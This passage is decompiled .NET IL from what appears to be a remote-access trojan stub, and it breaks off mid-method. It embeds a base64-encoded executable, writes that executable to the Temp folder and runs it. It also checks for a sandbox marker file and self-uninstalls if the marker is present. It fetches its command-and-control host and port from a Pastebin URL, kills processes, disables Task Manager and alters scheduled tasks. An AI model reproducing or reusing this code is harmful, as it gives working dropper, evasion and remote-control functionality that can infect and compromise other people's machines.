    + "APMCIAGDAPMCIwFzAPgCIwGjALYDKQG7AMUEQAGDAPMCQwFzAPgCQwGjAA8EYwFzAPgCYwF"
    + "TALYCgQGrAPMCoQFzAPgCwQGzAPMCwQGrAPMCAALDAPMCAAJzAK0CoALDAPMCwAKLAPMC4A"
    + "KDAPMCAAODAPMCIAODAPMCIANzAPgCQANzAPgCYANzAPgCgANzAPgCoANzAPgCAARzAPgCA"
    + "ASDAPMCIARzAPgCIASDAPMCQARzAPgCQASDAPMCYARzAPgCYASDAPMCgASDAPMCoASDAPMC"
    + "wASDAPMCwARzAPgC4ASDAPMCAAWDAPMCAAVzAPgCpwApAXcBBAABAAUABgAGAAgABwAJAAk"
    + "ACgALAAsAAAAnCVECAAD+BlYCAADTCFsCAABDC2ACAACiCWUCAAB6CGoCAACmAnACAAAuDH"
    + "YCAAD5CnYCAAA4AHsCAAAmAYACAgAGAAMAAgAHAAUAAgAIAAcAAgAJAAkAAgAKAAsAAgALA"
    + "A0AAgAMAA8AAQANAA8AAgARABEAAgASABMAAgAeABUAAQAfABUAAgAnABcAUQBYAF8AZgBt"
    + "ADABfAGHAQSAAAABAAAAAAAAAAAAAAAAAPkAAAACAAAAAAAAAAAAAACPAYwAAAAAAAIAAAA"
    + "AAAAAAAAAAI8BjAYAAAAACAAAAAAAAAAAAAAAmAGVAAAAAAACAAAAAAAAAAAAAACPASILAA"
    + "AAAAIAAAAAAAAAAAAAAJgBHQYAAAAAAAAAAAEAAACDCgAAuAAAAAEAAACZCgAACQAEAAoAB"
    + "AALAAQAAAAQABYAVwAAABAALwBXAAAAAAAxAFcAAAAQAEkAVwAAAAAASwBXANUASwEuAHIB"
    + "MAByAdUAigECAHUAAwB1AAAAAAAAUE9DXzEAVGhyZWFkU2FmZU9iamVjdFByb3ZpZGVyYDE"
    + "AbV9Gb3JtMQBnZXRfRm9ybTEAc2V0X0Zvcm0xADxNb2R1bGU+AFNpemVGAFN5c3RlbS5JTw"
    + "BUAERpc3Bvc2VfX0luc3RhbmNlX18AQ3JlYXRlX19JbnN0YW5jZV9fAFByb2plY3REYXRhA"
    + "G1zY29ybGliAE1pY3Jvc29mdC5WaXN1YWxCYXNpYwBUaHJlYWQARm9ybTFfTG9hZABhZGRf"
    + "TG9hZABBZGQAZ2V0X0lzRGlzcG9zZWQAbV9Gb3JtQmVpbmdDcmVhdGVkAFN5bmNocm9uaXp"
    + "lZABTYW5kAHNldF9Jc1NpbmdsZUluc3RhbmNlAENyZWF0ZUluc3RhbmNlAGdldF9HZXRJbn"
    + "N0YW5jZQBkZWZhdWx0SW5zdGFuY2UAaW5zdGFuY2UAR2V0SGFzaENvZGUAc2V0X0F1dG9TY"
    + "2FsZU1vZGUAQXV0aGVudGljYXRpb25Nb2RlAFNodXRkb3duTW9kZQBnZXRfTWVzc2FnZQBJ"
    + "RGlzcG9zYWJsZQBIYXNodGFibGUAc2V0X1Zpc2libGUAUnVudGltZVR5cGVIYW5kbGUAR2V"
    + "0VHlwZUZyb21IYW5kbGUAc2V0X1NodXRkb3duU3R5bGUAc2V0X0Zvcm1Cb3JkZXJTdHlsZQ"
    + "BzZXRfV2luZG93U3R5bGUAUHJvY2Vzc1dpbmRvd1N0eWxlAHNldF9OYW1lAHNldF9GaWxlT"
    + "mFtZQBnZXRfVXNlck5hbWUAZ2V0X0NvbXB1dGVyTmFtZQBXcml0ZUxpbmUAQ2hlY2tGb3JT"
    + "eW5jTG9ja09uVmFsdWVUeXBlAEdldFR5cGUAZ2V0X0N1bHR1cmUAc2V0X0N1bHR1cmUAcmV"
    + "zb3VyY2VDdWx0dXJlAFdpbmRvd3NGb3Jtc0FwcGxpY2F0aW9uQmFzZQBBcHBsaWNhdGlvbl"
    + "NldHRpbmdzQmFzZQBDbG9zZQBEaXNwb3NlAEVkaXRvckJyb3dzYWJsZVN0YXRlAFRocmVhZ"
    + "FN0YXRpY0F0dHJpYnV0ZQBTVEFUaHJlYWRBdHRyaWJ1dGUAQ29tcGlsZXJHZW5lcmF0ZWRB"
    + "dHRyaWJ1dGUARGVzaWduZXJHZW5lcmF0ZWRBdHRyaWJ1dGUAR3VpZEF0dHJpYnV0ZQBIZWx"
    + "wS2V5d29yZEF0dHJpYnV0ZQBHZW5lcmF0ZWRDb2RlQXR0cmlidXRlAERlYnVnZ2VyTm9uVX"
    + "NlckNvZGVBdHRyaWJ1dGUARGVidWdnYWJsZUF0dHJpYnV0ZQBFZGl0b3JCcm93c2FibGVBd"
    + "HRyaWJ1dGUAQ29tVmlzaWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmlidXRlAFN0"
    + "YW5kYXJkTW9kdWxlQXR0cmlidXRlAEhpZGVNb2R1bGVOYW1lQXR0cmlidXRlAERlYnVnZ2V"
    + "yU3RlcFRocm91Z2hBdHRyaWJ1dGUAQXNzZW1ibHlUcmFkZW1hcmtBdHRyaWJ1dGUARGVidW"
    + "dnZXJIaWRkZW5BdHRyaWJ1dGUAQXNzZW1ibHlGaWxlVmVyc2lvbkF0dHJpYnV0ZQBNeUdyb"
    + "3VwQ29sbGVjdGlvbkF0dHJpYnV0ZQBBc3NlbWJseURlc2NyaXB0aW9uQXR0cmlidXRlAENv"
    + "bXBpbGF0aW9uUmVsYXhhdGlvbnNBdHRyaWJ1dGUAQXNzZW1ibHlQcm9kdWN0QXR0cmlidXR"
    + "lAEFzc2VtYmx5Q29weXJpZ2h0QXR0cmlidXRlAEFzc2VtYmx5Q29tcGFueUF0dHJpYnV0ZQ"
    + "BSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBtX1RocmVhZFN0YXRpY1ZhbHVlAEdld"
    + "E9iamVjdFZhbHVlAFNhdmUAUmVtb3ZlAFNhbmQuZXhlAHNldF9DbGllbnRTaXplAFN5c3Rl"
    + "bS5UaHJlYWRpbmcAZ2V0X1VzZUNvbXBhdGlibGVUZXh0UmVuZGVyaW5nAEdldFJlc291cmN"
    + "lU3RyaW5nAENvbXBhcmVTdHJpbmcAVG9TdHJpbmcAZGlzcG9zaW5nAFN5c3RlbS5EcmF3aW"
    + "5nAGdldF9FeGVjdXRhYmxlUGF0aABHZXRUZW1wUGF0aABTeXN0ZW0uQ29tcG9uZW50TW9kZ"
    + "WwAQ29udGFpbmVyQ29udHJvbABPYmplY3RGbG93Q29udHJvbABnZXRfRmlsZVN5c3RlbQBz"
    + "ZXRfTWFpbkZvcm0AT25DcmVhdGVNYWluRm9ybQByZXNvdXJjZU1hbgBTeXN0ZW0uQ29tcG9"
    + "uZW50TW9kZWwuRGVzaWduAE1haW4Ac2V0X1Nob3dJY29uAGdldF9BcHBsaWNhdGlvbgBNeU"
    + "FwcGxpY2F0aW9uAFN5c3RlbUluZm9ybWF0aW9uAFN5c3RlbS5Db25maWd1cmF0aW9uAFN5c"
    + "3RlbS5HbG9iYWxpemF0aW9uAFN5c3RlbS5SZWZsZWN0aW9uAFRhcmdldEludm9jYXRpb25F"
    + "eGNlcHRpb24ASW52YWxpZE9wZXJhdGlvbkV4Y2VwdGlvbgBnZXRfSW5uZXJFeGNlcHRpb24"
    + "AQXJndW1lbnRFeGNlcHRpb24AUnVuAGFkZF9TaHV0ZG93bgBDdWx0dXJlSW5mbwBQcm9jZX"
    + "NzU3RhcnRJbmZvAFNsZWVwAHNldF9TaG93SW5UYXNrYmFyAG1fQXBwT2JqZWN0UHJvdmlkZ"
    + "XIAbV9Vc2VyT2JqZWN0UHJvdmlkZXIAbV9Db21wdXRlck9iamVjdFByb3ZpZGVyAG1fTXlX"
    + "ZWJTZXJ2aWNlc09iamVjdFByb3ZpZGVyAG1fTXlGb3Jtc09iamVjdFByb3ZpZGVyAHNlbmR"
    + "lcgBnZXRfUmVzb3VyY2VNYW5hZ2VyAGFkZGVkSGFuZGxlcgBTaHV0ZG93bkV2ZW50SGFuZG"
    + "xlcgBTeXN0ZW0uQ29kZURvbS5Db21waWxlcgBJQ29udGFpbmVyAGdldF9Vc2VyAE9wZW5UZ"
    + "Xh0RmlsZVdyaXRlcgBTdHJlYW1Xcml0ZXIAVGV4dFdyaXRlcgBFbnRlcgBnZXRfQ29tcHV0"
    + "ZXIAU2VydmVyQ29tcHV0ZXIATXlDb21wdXRlcgBTZXRQcm9qZWN0RXJyb3IAQWN0aXZhdG9"
    + "yAC5jdG9yAC5jY3RvcgBNb25pdG9yAFN5c3RlbS5EaWFnbm9zdGljcwBNaWNyb3NvZnQuVm"
    + "lzdWFsQmFzaWMuRGV2aWNlcwBnZXRfV2ViU2VydmljZXMATXlXZWJTZXJ2aWNlcwBNaWNyb"
    + "3NvZnQuVmlzdWFsQmFzaWMuQXBwbGljYXRpb25TZXJ2aWNlcwBTeXN0ZW0uUnVudGltZS5J"
    + "bnRlcm9wU2VydmljZXMATWljcm9zb2Z0LlZpc3VhbEJhc2ljLkNvbXBpbGVyU2VydmljZXM"
    + "AU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBNaWNyb3NvZnQuVmlzdWFsQmFzaW"
    + "MuTXlTZXJ2aWNlcwBTeXN0ZW0uUmVzb3VyY2VzAFBPQ18xLk15LlJlc291cmNlcwBQT0NfM"
    + "S5Gb3JtMS5yZXNvdXJjZXMAUE9DXzEuUmVzb3VyY2VzLnJlc291cmNlcwBEZWJ1Z2dpbmdN"
    + "b2RlcwBzZXRfRW5hYmxlVmlzdWFsU3R5bGVzAGdldF9TZXR0aW5ncwBBdXRvU2F2ZVNldHR"
    + "pbmdzAE15U2V0dGluZ3MARXZlbnRBcmdzAFJlZmVyZW5jZUVxdWFscwBVdGlscwBTeXN0ZW"
    + "0uV2luZG93cy5Gb3JtcwBnZXRfRm9ybXMATXlGb3JtcwBzZXRfQXV0b1NjYWxlRGltZW5za"
    + "W9ucwBTeXN0ZW0uQ29sbGVjdGlvbnMAUnVudGltZUhlbHBlcnMAT3BlcmF0b3JzAFByb2Nl"
    + "c3MAc2V0X0FyZ3VtZW50cwBjb21wb25lbnRzAENvbmNhdABhZGRlZEhhbmRsZXJMb2NrT2J"
    + "qZWN0AE15UHJvamVjdABnZXRfU2F2ZU15U2V0dGluZ3NPbkV4aXQAc2V0X1NhdmVNeVNldH"
    + "RpbmdzT25FeGl0AGdldF9EZWZhdWx0AFNldENvbXBhdGlibGVUZXh0UmVuZGVyaW5nRGVmY"
    + "XVsdABFbnZpcm9ubWVudABJbml0aWFsaXplQ29tcG9uZW50AFN0YXJ0AFN1c3BlbmRMYXlv"
    + "dXQAUmVzdW1lTGF5b3V0AHNldF9UZXh0AHNldF9DcmVhdGVOb1dpbmRvdwBzZXRfQ29udHJ"
    + "vbEJveABQT0NfMS5NeQBDb250YWluc0tleQBnZXRfQXNzZW1ibHkAc2V0X09wYWNpdHkATX"
    + "lTZXR0aW5nc1Byb3BlcnR5AEZpbGVTeXN0ZW1Qcm94eQAAAB9QAE8AQwBfADEALgBSAGUAc"
    + "wBvAHUAcgBjAGUAcwAAC2EAZABtAGkAbgAAD1UAUwBFAFIALQBQAEMAARFzAGEAbgBkAC4A"
    + "ZABhAHQAAAcwADAAMQAARS8AQwAgAGMAaABvAGkAYwBlACAALwBDACAAWQAgAC8ATgAgAC8"
    + "ARAAgAFkAIAAvAFQAIAAzACAAJgAgAEQAZQBsACAAAA9jAG0AZAAuAGUAeABlAABFLwBDAC"
    + "AAYwBoAG8AaQBjAGUAIAAvAEMAIABZACAALwBOACAALwBEACAAWQAgAC8AVAAgADUAIAAmA"
    + "CAARABlAGwAIAAAC0YAbwByAG0AMQAAOVcAaQBuAEYAbwByAG0AcwBfAFIAZQBjAHUAcgBz"
    + "AGkAdgBlAEYAbwByAG0AQwByAGUAYQB0AGUAADVXAGkAbgBGAG8AcgBtAHMAXwBTAGUAZQB"
    + "JAG4AbgBlAHIARQB4AGMAZQBwAHQAaQBvAG4AAEdQAHIAbwBwAGUAcgB0AHkAIABjAGEAbg"
    + "AgAG8AbgBsAHkAIABiAGUAIABzAGUAdAAgAHQAbwAgAE4AbwB0AGgAaQBuAGcAAABHdqEqn"
    + "mz4S4T1kRGar8bOAAQgAQEIAyAAAQUgAQEREQQgAQEOBCABAQIFIAIBDg4FIAEBET0HIAQB"
    + "Dg4ODgMAAAIEAAEBAgUgAQEdDgYgAQERgKkGIAEBEYCtBSABARJ1BhUSLAESDAYVEiwBEgg"
    + "GFRIsARJlBhUSLAESJAYVEiwBEigEIAATAAUAAgIcHAcAARJ9EYCxBSAAEoC1ByACAQ4SgL"
    + "UIAAESgLkSgLkEAAEcHAMgAAIDBwEcBAABARwFIAIBHBgGIAEBEoDJBiABARKAzQQAAQEIA"
    + "wAADgYAAwgODgIFIAASgOkFAAIODg4HIAISgPUOAgYgAQERgQEIAAESgQUSgP0DAAABBSAC"
    + "AQwMBiABARGBDQYgAQERgRUFIAIBCAgGIAEBEYEZBiABARGBHQQgAQENBgcCHgASeQIeAAQ"
    + "gAQIcBgACDg4dDgUgAgEcHAUQAQAeAAQKAR4ABgABARKBMQUgABKBMQMgAA4HIAIBDhKBMQ"
    + "QgAQEcAyAACAQKARIgBAcBHgAGFRIsARMAAwYTAAITAAQKARMACLd6XFYZNOCJCLA/X38R1"
    + "Qo6BwYVEiwBEgwHBhUSLAESCAcGFRIsARJlBwYVEiwBEiQHBhUSLAESKAQGEoCNBAYSgJED"
    + "BhIYAgYCAgYcBAYSgKEDBhJxAwYSIAUAAQEdDgQAABIMBAAAEggEAAASZQQAABIkBAAAEig"
    + "FAAASgI0FAAASgJEGAAEBEoCRBwACARwSgJkEAAASGAcgAgEcEoCZBxABAR4AHgAHMAEBAR"
    + "AeAAQgABJ9BCAAEiAFIAEBEiAECAASDAQIABIIBAgAEmUECAASJAQIABIoBQgAEoCNBQgAE"
    + "oCRBAgAEhgEKAASIAQoABMACAEACAAAAAAAHgEAAQBUAhZXcmFwTm9uRXhjZXB0aW9uVGhy"
    + "b3dzAQgBAAIAAAAAAAUBAAAAACkBACQ3MDY0YzA1OS02NWFkLTRhOGItODQ4YS0zMjUwYzR"
    + "kNTE0ZGEAAAwBAAcxLjAuMC4wAAAEAQAAAAgBAAEAAAAAABgBAApNeVRlbXBsYXRlCDExLj"
    + "AuMC4wAABBAQAzU3lzdGVtLlJlc291cmNlcy5Ub29scy5TdHJvbmdseVR5cGVkUmVzb3VyY"
    + "2VCdWlsZGVyCDE1LjAuMC4wAABZAQBLTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5FZGl0b3Jz"
    + "LlNldHRpbmdzRGVzaWduZXIuU2V0dGluZ3NTaW5nbGVGaWxlR2VuZXJhdG9yCDE1LjkuMC4"
    + "wAABYAQAZU3lzdGVtLldpbmRvd3MuRm9ybXMuRm9ybRJDcmVhdGVfX0luc3RhbmNlX18TRG"
    + "lzcG9zZV9fSW5zdGFuY2VfXxJNeS5NeVByb2plY3QuRm9ybXMAAGEBADRTeXN0ZW0uV2ViL"
    + "lNlcnZpY2VzLlByb3RvY29scy5Tb2FwSHR0cENsaWVudFByb3RvY29sEkNyZWF0ZV9fSW5z"
    + "dGFuY2VfXxNEaXNwb3NlX19JbnN0YW5jZV9fAAAAEAEAC015LkNvbXB1dGVyAAATAQAOTXk"
    + "uQXBwbGljYXRpb24AAAwBAAdNeS5Vc2VyAAANAQAITXkuRm9ybXMAABMBAA5NeS5XZWJTZX"
    + "J2aWNlcwAAEAEAC015LlNldHRpbmdzAAAAALQAAADOyu++AQAAAJEAAABsU3lzdGVtLlJlc"
    + "291cmNlcy5SZXNvdXJjZVJlYWRlciwgbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAuMCwgQ3Vs"
    + "dHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5I1N5c3RlbS5"
    + "SZXNvdXJjZXMuUnVudGltZVJlc291cmNlU2V0AgAAAAAAAAAAAAAAUEFEUEFEULQAAAC0AA"
    + "AAzsrvvgEAAACRAAAAbFN5c3RlbS5SZXNvdXJjZXMuUmVzb3VyY2VSZWFkZXIsIG1zY29yb"
    + "GliLCBWZXJzaW9uPTIuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49"
    + "Yjc3YTVjNTYxOTM0ZTA4OSNTeXN0ZW0uUmVzb3VyY2VzLlJ1bnRpbWVSZXNvdXJjZVNldAI"
    + "AAAAAAAAAAAAAAFBBRFBBRFC0AAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAORHAA"
    + "AAAAAAAAAAAP5HAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAADwRwAAAAAAAAAAAAAAAF9Db"
    + "3JFeGVNYWluAG1zY29yZWUuZGxsAAAAAAD/JQAgQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    + "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    + "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    + "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    + "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    + "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    + "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    + "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    + "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    + "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    + "AAAAAAAIAEAAAACAAAIAYAAAAUAAAgAAAAAAAAAAAAAAAAAAAAQABAAAAOAAAgAAAAAAAAA"
    + "AAAAAAAAAAAQAAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAQABAAAAaAAAgAAAAAAAAAAAAAAAA"
    + "AAAAQAAAAAAXAMAAJBgAADMAgAAAAAAAAAAAADMAjQAAABWAFMAXwBWAEUAUgBTAEkATwBO"
    + "AF8ASQBOAEYATwAAAAAAvQTv/gAAAQAAAAEAAAAAAAAAAQAAAAAAPwAAAAAAAAAEAAAAAQA"
    + "AAAAAAAAAAAAAAAAAAEQAAAABAFYAYQByAEYAaQBsAGUASQBuAGYAbwAAAAAAJAAEAAAAVA"
    + "ByAGEAbgBzAGwAYQB0AGkAbwBuAAAAAAAAALAELAIAAAEAUwB0AHIAaQBuAGcARgBpAGwAZ"
    + "QBJAG4AZgBvAAAACAIAAAEAMAAwADAAMAAwADQAYgAwAAAAGgABAAEAQwBvAG0AbQBlAG4A"
    + "dABzAAAAAAAAACIAAQABAEMAbwBtAHAAYQBuAHkATgBhAG0AZQAAAAAAAAAAACoAAQABAEY"
    + "AaQBsAGUARABlAHMAYwByAGkAcAB0AGkAbwBuAAAAAAAAAAAAMAAIAAEARgBpAGwAZQBWAG"
    + "UAcgBzAGkAbwBuAAAAAAAxAC4AMAAuADAALgAwAAAAMgAJAAEASQBuAHQAZQByAG4AYQBsA"
    + "E4AYQBtAGUAAABTAGEAbgBkAC4AZQB4AGUAAAAAACYAAQABAEwAZQBnAGEAbABDAG8AcAB5"
    + "AHIAaQBnAGgAdAAAAAAAAAAqAAEAAQBMAGUAZwBhAGwAVAByAGEAZABlAG0AYQByAGsAcwA"
    + "AAAAAAAAAADoACQABAE8AcgBpAGcAaQBuAGEAbABGAGkAbABlAG4AYQBtAGUAAABTAGEAbg"
    + "BkAC4AZQB4AGUAAAAAACIAAQABAFAAcgBvAGQAdQBjAHQATgBhAG0AZQAAAAAAAAAAADQAC"
    + "AABAFAAcgBvAGQAdQBjAHQAVgBlAHIAcwBpAG8AbgAAADEALgAwAC4AMAAuADAAAAA4AAgA"
    + "AQBBAHMAcwBlAG0AYgBsAHkAIABWAGUAcgBzAGkAbwBuAAAAMQAuADAALgAwAC4AMAAAAGx"
    + "jAADqAQAAAAAAAAAAAADvu788P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJVVEYtOC"
    + "Igc3RhbmRhbG9uZT0ieWVzIj8+DQoNCjxhc3NlbWJseSB4bWxucz0idXJuOnNjaGVtYXMtb"
    + "Wljcm9zb2Z0LWNvbTphc20udjEiIG1hbmlmZXN0VmVyc2lvbj0iMS4wIj4NCiAgPGFzc2Vt"
    + "Ymx5SWRlbnRpdHkgdmVyc2lvbj0iMS4wLjAuMCIgbmFtZT0iTXlBcHBsaWNhdGlvbi5hcHA"
    + "iLz4NCiAgPHRydXN0SW5mbyB4bWxucz0idXJuOnNjaGVtYXMtbWljcm9zb2Z0LWNvbTphc2"
    + "0udjIiPg0KICAgIDxzZWN1cml0eT4NCiAgICAgIDxyZXF1ZXN0ZWRQcml2aWxlZ2VzIHhtb"
    + "G5zPSJ1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOmFzbS52MyI+DQogICAgICAgIDxyZXF1"
    + "ZXN0ZWRFeGVjdXRpb25MZXZlbCBsZXZlbD0iYXNJbnZva2VyIiB1aUFjY2Vzcz0iZmFsc2U"
    + "iLz4NCiAgICAgIDwvcmVxdWVzdGVkUHJpdmlsZWdlcz4NCiAgICA8L3NlY3VyaXR5Pg0KIC"
    + "A8L3RydXN0SW5mbz4NCjwvYXNzZW1ibHk+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    + "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    + "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    + "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAADAAAABA4AAAAAAAAAA"
    + "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    + "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    + "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    + "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    + "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    + "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    + "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    + "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    + "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    + "AAAAAAAAAAAAAAAAAAAAA=="
    IL_0031:  call       uint8[] [mscorlib]System.Convert::FromBase64String(string)
    IL_0036:  stloc.0
    IL_0037:  call       class My.MyComputer My.MyProject::get_Computer()
    IL_003c:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
    IL_0041:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.SpecialDirectoriesProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::get_SpecialDirectories()
    IL_0046:  callvirt   instance string [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.SpecialDirectoriesProxy::get_Temp()
    IL_004b:  ldstr      "\\"
    IL_0050:  ldsfld     string j.OK::Bypass
    IL_0055:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_005a:  ldloc.0
    IL_005b:  call       void [mscorlib]System.IO.File::WriteAllBytes(string,
                                                                      uint8[])
    IL_0060:  ldc.i4     0x3e8
    IL_0065:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_006a:  call       class My.MyComputer My.MyProject::get_Computer()
    IL_006f:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
    IL_0074:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.SpecialDirectoriesProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::get_SpecialDirectories()
    IL_0079:  callvirt   instance string [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.SpecialDirectoriesProxy::get_Temp()
    IL_007e:  ldstr      "\\"
    IL_0083:  ldsfld     string j.OK::Bypass
    IL_0088:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_008d:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
    IL_0092:  pop
    IL_0093:  ldc.i4     0x1388
    IL_0098:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_009d:  call       string [mscorlib]System.IO.Path::GetTempPath()
    IL_00a2:  ldstr      "sand.dat"
    IL_00a7:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_00ac:  call       bool [mscorlib]System.IO.File::Exists(string)
    IL_00b1:  brfalse.s  IL_00cc

    IL_00b3:  ldstr      "127.0.0.1"
    IL_00b8:  stsfld     string j.OK::H
    IL_00bd:  call       void j.OK::UNS()
    IL_00c2:  call       void [System.Windows.Forms]System.Windows.Forms.Application::Exit()
    IL_00c7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_00cc:  ldsfld     bool j.OK::PasteE
    IL_00d1:  brfalse.s  IL_0115

    IL_00d3:  newobj     instance void [System]System.Net.WebClient::.ctor()
    IL_00d8:  ldsfld     string j.OK::PASTEBIN
    IL_00dd:  call       instance string [System]System.Net.WebClient::DownloadString(string)
    IL_00e2:  ldc.i4.1
    IL_00e3:  newarr     [mscorlib]System.Char
    IL_00e8:  dup
    IL_00e9:  ldc.i4.0
    IL_00ea:  ldc.i4.s   58
    IL_00ec:  stelem.i2
    IL_00ed:  callvirt   instance string[] [mscorlib]System.String::Split(char[])
    IL_00f2:  stloc.1
    IL_00f3:  ldloc.1
    IL_00f4:  ldlen
    IL_00f5:  conv.i4
    IL_00f6:  ldc.i4.1
    IL_00f7:  sub.ovf
    IL_00f8:  stloc.3
    IL_00f9:  ldc.i4.0
    IL_00fa:  stloc.2
    IL_00fb:  br.s       IL_0111

    IL_00fd:  ldloc.1
    IL_00fe:  ldc.i4.0
    IL_00ff:  ldelem.ref
    IL_0100:  stsfld     string j.OK::H
    IL_0105:  ldloc.1
    IL_0106:  ldc.i4.1
    IL_0107:  ldelem.ref
    IL_0108:  stsfld     string j.OK::P
    IL_010d:  ldloc.2
    IL_010e:  ldc.i4.1
    IL_010f:  add.ovf
    IL_0110:  stloc.2
    IL_0111:  ldloc.2
    IL_0112:  ldloc.3
    IL_0113:  ble.s      IL_00fd

    IL_0115:  ldc.i4.0
    IL_0116:  stsfld     bool j.OK::Cn
    IL_011b:  ldc.i4     0x7d0
    IL_0120:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_0125:  ldsfld     bool j.OK::KProc
    IL_012a:  brfalse.s  IL_0148

    IL_012c:  ldstr      "taskkill /f im "
    IL_0131:  ldsfld     string j.OK::Proc
    IL_0136:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_013b:  ldc.i4.0
    IL_013c:  ldc.i4.1
    IL_013d:  ldc.i4     0x1388
    IL_0142:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                               valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                               bool,
                                                                                               int32)
    IL_0147:  pop
    IL_0148:  ldsfld     bool j.OK::TaskMGR
    IL_014d:  brfalse.s  IL_0154

    IL_014f:  call       void Stub.NoTsk::Start()
    IL_0154:  ldsfld     bool j.OK::Sched
    IL_0159:  brfalse    IL_01e6

    .try
    {
      IL_015e:  ldstr      "schtasks /delete /tn \""
      IL_0163:  ldsfld     string j.OK::SCHEDNAME
      IL_0168:  ldstr      "\" /f"
      IL_016d:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0172:  ldc.i4.0
      IL_0173:  ldc.i4.1
      IL_0174:  ldc.i4     0x1388
      IL_0179:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_017e:  pop
      IL_017f:  ldc.i4.5
